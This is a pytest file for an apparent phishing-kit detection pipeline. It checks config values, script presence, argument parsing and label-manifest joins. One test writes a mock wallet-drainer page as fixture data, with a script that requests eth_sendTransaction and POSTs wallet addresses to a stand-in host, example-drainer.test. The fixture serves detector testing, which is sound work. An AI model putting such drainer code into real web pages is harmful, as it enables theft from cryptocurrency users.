import json
import sys
from pathlib import Path

import pandas as pd
import yaml


def test_public_pipeline_config_points_to_original_route_files():
    repo = Path(__file__).resolve().parents[1]
    config = yaml.safe_load((repo / "configs" / "pipeline_main_random.yaml").read_text(encoding="utf-8"))

    assert config["route_config"] == "configs/layer1_default_causal_online_20260808.yaml"
    assert config["extraction_config"] == "configs/universal_interactive_phishing_gateway_oracle_plus_noguard.yaml"
    assert config["runner_model_config"] == "configs/default.yaml"
    assert config["fair_comparison_runner"] == "scripts/run_fair_multiscale_window_comparison.py"
    assert config["column_spec"] == "configs/comparison_column_spec.json"
    assert config["condition"] == "five_windows"
    assert config["variant"] == "dynamic_rank8"
    assert config["scan_step_s"] == 0.5
    assert config["candidate_extraction_contract"] == "causal_all_onsets"
    assert config["candidate_decision_delays_s"] == [0.75, 1.5, 2.5, 3.5]
    assert config["causal_all_local_maxima"] is True
    assert config["fallback_if_empty"] is False
    assert config["min_after_capture_start_s"] == 0.0
    assert config["min_after_first_party_s"] == 0.0
    assert config["min_after_post_load_s"] == 0.0
    assert config["max_scan_s"] is None
    assert config["post_load_guard_mode"] == "none"
    assert config["skip_first_party_scan_guard"] is False

    profiles = {profile["name"]: profile for profile in config["profiles"]}
    assert profiles["KitScope-CR"]["representation"] == "425"
    assert profiles["KitScope-EV"]["representation"] == "228"


def test_original_route_config_matches_table3_random_route():
    repo = Path(__file__).resolve().parents[1]
    route = yaml.safe_load((repo / "configs" / "layer1_default_causal_online_20260808.yaml").read_text(encoding="utf-8"))
    extraction = yaml.safe_load((repo / "configs" / "universal_interactive_phishing_gateway_oracle_plus_noguard.yaml").read_text(encoding="utf-8"))

    assert route["route_id"] == "causal_multidelay_five_window_dynamic_rank8_balanced_dann_hybrid"
    assert route["candidate_generation"]["scan_step_s"] == 0.5
    assert extraction["candidate"]["scan_step_s"] == 0.50
    assert route["windows"]["names"] == ["adaptive", "w2", "w4", "w7", "w10"]
    assert route["onset_ranker"]["admission"] == "dynamic_top8_so_far"
    assert route["onset_ranker"]["max_active_candidates"] == 8
    assert route["onset_ranker"]["complete_session_rank_allowed"] is False
    assert route["classifier"]["base_model"] == "lightgbm"
    assert route["classifier"]["sample_weighting"] == "session_normalized_balanced"
    assert route["classifier"]["representation_presets"]["425"] == "kit_l1_core_transport_invariant_stackclean"
    assert route["classifier"]["representation_presets"]["228"] == "kit_l1_core_shape_only"
    assert route["representation_ensemble"]["enabled"] is True
    assert route["representation_ensemble"]["model"] == "balanced_kit_dann"
    assert route["representation_ensemble"]["balance_kit_loss"] is True
    assert route["representation_ensemble"]["balance_era_within_label"] is True
    assert route["representation_ensemble"]["selection_metric"] == "plain_f1"
    assert route["aggregation"]["normal_alert_score"] == "mean_of_top2_distinct_candidate_scores"
    assert route["calibration"]["alpha"] == 0.03
    assert route["single_candidate_override"]["target_fpr"] == 0.002


def test_formal_route_code_is_present_and_demo_modules_are_absent():
    repo = Path(__file__).resolve().parents[1]
    for rel in [
        "scripts/run_layer1_openset_suite.py",
        "scripts/run_kitscope.ps1",
        "scripts/run_layer1_candidate_phishing_detection.py",
        "scripts/run_layer1_phishing_detection.py",
        "scripts/run_candidate_onset_ranker.py",
        "scripts/run_fair_multiscale_window_comparison.py",
        "scripts/run_causal_random_all_onsets_experiment.py",
        "scripts/layer1_kit_dann_representation.py",
        "scripts/preprocess_distributed_dataset.py",
        "scripts/prepare_public_release_inputs.py",
        "scripts/build_backend_static_family_assignments.py",
        "scripts/cluster_backend_kit_labels.py",
        "scripts/merge_backend_kit_fragments.py",
        "scripts/merge_backend_kit_static_neighbors.py",
        "scripts/apply_backend_kit_audit_corrections.py",
        "scripts/rebuild_backend_kit_evidence_corrections.py",
        "scripts/build_backend_kit_final_labels.py",
        "scripts/rebuild_snapshot_kit_labels.py",
        "scripts/audit_layer2_backend_kit_identity.py",
        "scripts/build_final_experiment_manifest.py",
    ]:
        assert (repo / rel).is_file(), rel

    assert not (repo / "src/kitscope/public_pipeline.py").exists()
    assert not (repo / "src/kitscope/dann.py").exists()
    assert not (repo / "src/kitscope/feature_presets.py").exists()
    assert not (repo / "src/kitscope/table3_random.py").exists()
    old_entry = "run_" + "public_" + "pipeline_background.ps1"
    assert not (repo / "scripts" / old_entry).exists()


def test_main_runner_uses_formal_dynamic_rank8_route():
    repo = Path(__file__).resolve().parents[1]
    script = (repo / "scripts" / "run_kitscope.ps1").read_text(encoding="utf-8")
    readme = (repo / "README.md").read_text(encoding="utf-8")

    assert "run_fair_multiscale_window_comparison.py" in script
    assert "--condition\", \"five_windows\"" in script
    assert "--variant\", \"dynamic_rank8\"" in script
    assert "--causal-all-onsets" in script
    assert "--candidate-scan-step" in script
    assert "0.5" in script
    assert "--candidate-decision-delays" in script
    assert "0.75,1.5,2.5,3.5" in script
    assert "learned_latency_diverse_rank" not in script

    assert "run_kitscope.ps1" in readme
    assert "candidate-decision-delays" not in readme
    assert "causal-all-onsets" not in readme
    assert "learned_latency_diverse_rank" not in readme
    assert "run_layer1_openset_suite.py" not in readme


def test_feature_shard_causal_all_onsets_override_matches_main_random_contract():
    repo = Path(__file__).resolve().parents[1]
    sys.path.insert(0, str(repo / "scripts"))
    from preprocess_distributed_dataset import _apply_feature_extraction_overrides, _scenario_specs, build_parser

    args = build_parser().parse_args(
        [
            "feature-shard",
            "--input-glob", "dummy.txt",
            "--out-dir", "dummy-out",
            "--shard-id", "main_random",
            "--scenario-set", "none",
            "--config", "main_random=configs/universal_interactive_phishing_gateway_oracle_plus_noguard.yaml",
            "--expected-post-load-guard-mode", "none",
            "--causal-all-onsets",
            "--candidate-decision-delays", "0.75,1.5,2.5,3.5",
            "--candidate-scan-step", "0.5",
        ]
    )
    scenario = _apply_feature_extraction_overrides(_scenario_specs(args), args)[0]
    anchor = scenario.config["anchor"]
    candidate = scenario.config["candidate"]

    assert anchor["mode"] == "heuristic"
    assert anchor["post_load_guard_mode"] == "none"
    assert candidate["causal_all_local_maxima"] is True
    assert candidate["fallback_if_empty"] is False
    assert candidate["min_after_capture_start_s"] == 0.0
    assert candidate["min_after_first_party_s"] == 0.0
    assert candidate["min_after_post_load_s"] == 0.0
    assert candidate["max_scan_s"] is None
    assert candidate["decision_delays_s"] == [0.75, 1.5, 2.5, 3.5]
    assert candidate["scan_step_s"] == 0.5
    assert not candidate.get("skip_first_party_scan_guard", False)


def test_rebuilt_kit_label_manifest_materializes_runner_kit_labels(tmp_path):
    repo = Path(__file__).resolve().parents[1]
    sys.path.insert(0, str(repo / "scripts"))
    from prepare_public_release_inputs import build_parser, prepare

    data = tmp_path / "release"
    out = tmp_path / "runner_inputs"
    for folder in ("pcap", "har", "json"):
        (data / folder).mkdir(parents=True, exist_ok=True)

    rows = [
        {"capture_id": "cap_fit", "label": "phishing", "partition": "fit", "fit_role": "fit_train", "source": "test"},
        {"capture_id": "cap_eval", "label": "phishing", "partition": "evaluation", "fit_role": "", "source": "test"},
    ]
    with (data / "manifest.jsonl").open("w", encoding="utf-8") as handle:
        for row in rows:
            handle.write(json.dumps(row) + "\n")
    for capture_id in ("cap_fit", "cap_eval"):
        (data / "pcap" / f"{capture_id}.pcap").write_bytes(b"\xd4\xc3\xb2\xa1\x02\x00\x04\x00" + b"\0" * 16)
        (data / "har" / f"{capture_id}.har").write_text("{}", encoding="utf-8")
        (data / "json" / f"{capture_id}.json").write_text("{}", encoding="utf-8")

    labels_manifest = tmp_path / "kit_label_manifest.csv"
    pd.DataFrame(
        [
            {"capture_id": "cap_fit", "kit_family_id": "backend_kit:fitfam", "fit_eligible": True},
            {"capture_id": "cap_eval", "kit_family_id": "backend_kit:evalfam", "fit_eligible": True},
        ]
    ).to_csv(labels_manifest, index=False)

    args = build_parser().parse_args(
        [
            "--data-root", str(data),
            "--out-dir", str(out),
            "--kit-label-manifest", str(labels_manifest),
        ]
    )
    prepare(args)

    kit = pd.read_csv(out / "kit_labels.csv")
    assert set(kit["capture_id"]) == {"cap_fit", "cap_eval"}
    assert dict(zip(kit["capture_id"], kit["kit_family_id"])) == {
        "cap_fit": "backend_kit:fitfam",
        "cap_eval": "backend_kit:evalfam",
    }
    assert dict(zip(kit["capture_id"], kit["fit_eligible"].astype(bool))) == {
        "cap_fit": True,
        "cap_eval": False,
    }
    assert all("/json/" in path.replace("\\", "/") for path in kit["zip_path"].astype(str))


def test_static_shard_reads_public_release_static_context(tmp_path):
    repo = Path(__file__).resolve().parents[1]
    sys.path.insert(0, str(repo / "scripts"))
    from preprocess_distributed_dataset import build_parser, cmd_static_shard

    data = tmp_path / "release"
    cid = "cap_static"
    static_dir = data / "static_features" / cid
    for folder in ("pcap", "har", "json"):
        (data / folder).mkdir(parents=True, exist_ok=True)
    (static_dir / "html").mkdir(parents=True, exist_ok=True)
    (static_dir / "dom_snapshots").mkdir(parents=True, exist_ok=True)
    (data / "pcap" / f"{cid}.pcap").write_bytes(b"\xd4\xc3\xb2\xa1\x02\x00\x04\x00" + b"\0" * 16)
    (data / "har" / f"{cid}.har").write_text(
        json.dumps(
            {
                "log": {
                    "entries": [
                        {
                            "request": {
                                "method": "POST",
                                "url": "https://example-drainer.test/api/save_erc_data",
                                "postData": {
                                    "text": "{\"auth_address\":\"0x1111111111111111111111111111111111111111\"}"
                                },
                            },
                            "response": {"content": {"mimeType": "application/json", "text": "{\"ok\":true}"}},
                        }
                    ]
                }
            }
        ),
        encoding="utf-8",
    )
    session = {
        "schema_version": "kitscope-public-sample-v1",
        "capture_id": cid,
        "session_id": "session-static",
        "label": "phishing",
        "domain": "example-drainer.test",
        "url": "https://example-drainer.test",
        "pcap_path": f"pcap/{cid}.pcap",
        "har_path": f"har/{cid}.har",
        "sample": {"sample_id": "phishing_static", "label": "phishing", "url": "https://example-drainer.test"},
        "flags": {"connect_confirmed": True},
    }
    (data / "json" / f"{cid}.json").write_text(json.dumps(session), encoding="utf-8")
    (static_dir / "html" / "initial_page_loaded.html").write_text(
        """
        <html><head><title>Claim Reward</title></head><body>
        <button>Connect Wallet</button>
        <script src="/assets/js/drainer.js"></script>
        <script>
        async function runDrain() {
          await window.ethereum.request({method: 'eth_sendTransaction', params: [{to:'0x2222222222222222222222222222222222222222'}]});
          await fetch('/api/save_erc_data', {method:'POST', body: JSON.stringify({auth_address:'0x3333333333333333333333333333333333333333', spender:'0x4444444444444444444444444444444444444444'})});
        }
        </script></body></html>
        """,
        encoding="utf-8",
    )
    (static_dir / "dom_snapshots" / "initial_page_loaded.json").write_text(
        json.dumps({"title": "Claim Reward", "body_text": "Claim Reward Connect Wallet"}),
        encoding="utf-8",
    )
    manifest = tmp_path / "static_snapshot_manifest.csv"
    pd.DataFrame(
        [
            {
                "capture_id": cid,
                "sample_path": str(static_dir),
                "json_path": str(data / "json" / f"{cid}.json"),
                "har_path": str(data / "har" / f"{cid}.har"),
                "label": "phishing",
                "source": "phish_drainer",
                "source_variant": "main",
                "source_folder": "phish_drainer",
                "domain": "example-drainer.test",
                "url": "https://example-drainer.test",
            }
        ]
    ).to_csv(manifest, index=False)

    out = tmp_path / "static_shards"
    args = build_parser().parse_args(
        [
            "static-shard",
            "--input-list",
            str(manifest),
            "--out-dir",
            str(out),
            "--shard-id",
            "release_static",
            "--skip-errors",
        ]
    )
    cmd_static_shard(args)

    features = pd.read_csv(out / "release_static" / "static_with_har" / "static_family_features.csv")
    assert len(features) == 1
    row = features.iloc[0]
    assert row["capture_id"] == cid
    assert row["label"] == "phishing"
    assert row["source_folder"] == "phish_drainer"
    assert int(row["n_family_features"]) > 0
    assert "eth_sendtransaction" in row["methods"]


def test_rebuild_kit_manifest_prefers_capture_id_join(tmp_path):
    repo = Path(__file__).resolve().parents[1]
    sys.path.insert(0, str(repo / "scripts"))
    from rebuild_snapshot_kit_labels import _build_kit_manifest

    snapshot = tmp_path / "static_snapshot_manifest.csv"
    static_features = tmp_path / "static_features.csv"
    assignments = tmp_path / "assignments.csv"
    labels = tmp_path / "labels.csv"
    out = tmp_path / "kit_label_manifest.csv"
    pd.DataFrame(
        [
            {
                "capture_id": "cap_a",
                "sample_path": "X:/phish_dataset/kitscope_public_release/static_features/cap_a",
                "label": "phishing",
                "source": "phish_drainer",
                "source_variant": "main",
            }
        ]
    ).to_csv(snapshot, index=False)
    pd.DataFrame([{"capture_id": "cap_a", "family_features_json": "[]"}]).to_csv(static_features, index=False)
    pd.DataFrame(
        [
            {
                "capture_id": "cap_a",
                "zip_path": "different/prefix/static_features/cap_a",
                "static_family_key": "backend_kit:abc",
                "evidence_tier": "strong",
                "evidence_note": "test",
                "primary_evidence_type": "backend_kit_hash",
                "primary_evidence_channel": "backend",
                "independent_support_channel_count": 2,
                "strong_supporting_key_count": 1,
            }
        ]
    ).to_csv(assignments, index=False)
    pd.DataFrame(
        [
            {
                "capture_id": "cap_a",
                "zip_path": "another/prefix/static_features/cap_a",
                "static_family_key": "backend_kit:abc",
                "kit_cluster": "cluster_1",
                "backend_kit_training_label": True,
            }
        ]
    ).to_csv(labels, index=False)

    summary = _build_kit_manifest(snapshot, static_features, assignments, labels, out)
    rebuilt = pd.read_csv(out)
    assert summary["assignment_join_key"] == "capture_id"
    assert summary["label_join_key"] == "capture_id"
    assert rebuilt.loc[0, "capture_id"] == "cap_a"
    assert rebuilt.loc[0, "kit_family_id"] == "backend_kit:abc"
    assert bool(rebuilt.loc[0, "fit_eligible"]) is True
